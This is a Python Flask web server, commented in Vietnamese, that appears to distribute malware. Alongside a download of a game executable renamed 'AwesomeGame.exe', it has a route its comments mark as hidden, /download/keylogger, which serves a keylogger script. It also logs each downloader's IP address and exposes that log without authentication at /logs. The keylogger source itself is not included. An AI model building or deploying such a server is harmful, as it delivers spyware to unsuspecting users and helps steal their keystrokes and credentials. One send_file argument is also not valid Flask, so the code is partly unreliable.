from flask import Flask, render_template, send_file, request, jsonify
import os
import logging
from datetime import datetime

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Route chính - trang chủ
@app.route('/')
def index():
    logger.info(f"Trang chủ được truy cập từ {request.remote_addr}")
    return render_template('index.html')

# Route download game
@app.route('/download/game')
def download_game():
    try:
        client_ip = request.remote_addr
        logger.info(f"Download game được yêu cầu từ {client_ip}")
        
        # Ghi log download
        log_download(client_ip, 'game.exe')
        
        # Đường dẫn đến file game
        game_path = os.path.join('downloads', 'game.exe')
        
        # Kiểm tra nếu file tồn tại
        if os.path.exists(game_path):
            logger.info(f"File game.exe tồn tại, bắt đầu tải về")
            return send_file(game_path, as_attachment=True, as_attachment_filename="AwesomeGame.exe")
        else:
            logger.error(f"File game.exe không tồn tại tại đường dẫn: {game_path}")
            return "File not found", 404
            
    except Exception as e:
        logger.error(f"Lỗi khi xử lý download: {str(e)}")
        return "Internal Server Error", 500

# Route download keylogger (ẩn)
@app.route('/download/keylogger')
def download_keylogger():
    try:
        client_ip = request.remote_addr
        logger.info(f"Download keylogger được yêu cầu từ {client_ip}")
        
        # Ghi log download
        log_download(client_ip, 'keylogger.py')
        
        # Đường dẫn đến file keylogger
        keylogger_path = os.path.join('downloads', 'keylogger.py')
        
        # Kiểm tra nếu file tồn tại
        if os.path.exists(keylogger_path):
            return send_file(keylogger_path, as_attachment=True)
        else:
            logger.error(f"File keylogger.py không tồn tại tại đường dẫn: {keylogger_path}")
            return "File not found", 404
            
    except Exception as e:
        logger.error(f"Lỗi khi xử lý download keylogger: {str(e)}")
        return "Internal Server Error", 500

# API endpoint để ghi log (có thể được gọi từ JavaScript)
@app.route('/api/log-download', methods=['POST'])
def api_log_download():
    try:
        data = request.json
        client_ip = request.remote_addr
        filename = data.get('filename', 'unknown')
        
        log_download(client_ip, filename)
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Lỗi khi ghi log: {str(e)}")
        return jsonify({'status': 'error'}), 500

# Hàm ghi log download
def log_download(ip_address, filename):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - Download {filename} from IP: {ip_address}\n"
        
        # Đảm bảo thư mục logs tồn tại
        os.makedirs('logs', exist_ok=True)
        
        # Ghi log vào file
        with open('logs/downloads.log', 'a') as log_file:
            log_file.write(log_entry)
        
        logger.info(f"Đã ghi log: {log_entry.strip()}")
    except Exception as e:
        logger.error(f"Lỗi khi ghi log: {str(e)}")

# Route để xem log (chỉ cho mục đích debug)
@app.route('/logs')
def view_logs():
    try:
        log_path = os.path.join('logs', 'downloads.log')
        if os.path.exists(log_path):
            with open(log_path, 'r') as log_file:
                logs = log_file.read()
            return f"<pre>{logs}</pre>"
        else:
            return "No logs found"
    except Exception as e:
        return f"Error reading logs: {str(e)}"

# Health check endpoint cho Render
@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

# Xử lý lỗi 404
@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

# Xử lý lỗi 500
@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    # Lấy port từ biến môi trường (Render sẽ cung cấp) hoặc mặc định là 10000
    port = int(os.environ.get('PORT', 10000))
    
    # Chạy ứng dụng
    app.run(host='0.0.0.0', port=port, debug=False)
